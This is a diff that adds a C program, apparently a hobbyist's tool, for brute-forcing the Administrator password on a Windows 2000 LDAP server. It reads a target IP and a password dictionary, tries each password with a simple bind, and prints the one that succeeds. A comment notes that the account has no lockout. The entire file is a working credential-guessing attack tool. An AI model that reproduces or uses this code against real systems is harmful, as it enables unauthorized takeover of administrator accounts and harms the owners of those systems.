@@ -1,0 +1,88 @@
+ /*
+After hours of playing with tools that are buggy and keep crashing!!, I got fed up and wrote my own! I LUB COFFIE!!!!! :-)
+
+Author: FooTE
+
+COMPILED UNDER LINUX USING GCC
+*/
+
+//load the ldap library
+#include <ldap.h>
+#include <stdio.h>
+
+
+int main(int argc, char  *argv[])
+{
+   
+   //pointer to password file (used to get passwords)
+   FILE *pass_list;
+   //stores ip address
+   char host[90];
+   //path to file
+   char passFile[256];
+   //main LDAP connection
+   LDAP *ldapConnection;
+   //Char to store current password during brute force
+   char password[256];
+
+      printf("\nWindows 2000 LDAP Brute Force\n");
+      printf("Written By FooTE\n\n");
+
+      printf("Enter Target Machine IP: ");
+  //get the target host IP address - Stored as char [] into host
+      scanf("%s", &host);
+
+      printf("Enter pass dictionary: ");
+      //get the password dictionary - Stored as char [] into passFile
+      scanf("%s", &passFile);
+
+      /* Use the admin account to brute force! There is no lockout!*/
+      //char user = "CN=Administrator,CN=Users,DC=Teaching,DC=Com";
+      //change this address to the admin path on the target server!
+      char user [] = "CN=Administrator,CN=Users,DC=Teaching,DC=Com";
+
+     //init the ldap connection and check if successfull!
+      if ((ldapConnection = ldap_init(host, LDAP_PORT)) == NULL) {
+        perror("Error Establishing LDAP Connection!");
+
+      //exit saying there was an error exit param 1 !
+        exit (1);
+      }
+
+      printf ("\nConnected To LDAP Server!\n");
+
+      /* Load the password dict as read-only*/
+      if ((pass_list = fopen(passFile, "r")) == NULL) {
+        perror("Unable to Open File!");
+        exit(1);
+      }
+
+      printf ("\nBrute Forcing Account: %s\n", user);
+
+     //clear stdout stream ready to brute force!
+      fflush(stdout);
+
+     //main bruteforce engine
+     //while status != LDAP_SUCCESS loop untill out of passwords
+      do {
+ // read password into memory and then transfer to new line in file
+       if (fgets(password, sizeof(password) - 1, pass_list) == NULL) {
+             printf ("Password Not Found!\n");
+             exit(1);
+         } else {
+            /* append a 0 to end to indicate end of string! */
+           password[strlen(password) - 1] = '\0';
+         }
+      
+      //clear stdout stream ready for next pass
+         fflush(stdout);
+    //simpe bind to the server using a syncronous connection
+    // the syncronous connection waits for the connection status
+    // to be returned! i need that before moving onto nxt pass!
+      } while ((ldap_simple_bind_s(ldapConnection, user, password)) != LDAP_SUCCESS);
+
+     printf ("\nSuccessfully Logged In With Password: %s\n\n", password);
+   
+   //finished so clean exit
+   exit(0);
+}
